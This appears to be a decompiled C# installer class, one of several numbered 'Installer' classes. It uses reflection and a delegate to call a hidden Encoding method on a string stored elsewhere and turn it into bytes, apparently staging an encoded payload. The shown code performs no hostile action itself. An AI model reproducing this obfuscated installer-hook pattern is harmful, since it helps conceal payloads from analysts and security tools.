using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Text;

namespace dsui;

[RunInstaller(true)]
public class Installer16 : Installer
{
	internal static byte[] Gby = ((Installer7.Gb)Delegate.CreateDelegate(typeof(Installer7.Gb), Encoding.UTF8, typeof(Encoding).GetMethod(Installer27.Gbs, new Type[1] { typeof(string) })))(Installer1.v);

	private IContainer components;

	public Installer16()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Component)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		components = new Container();
	}
}
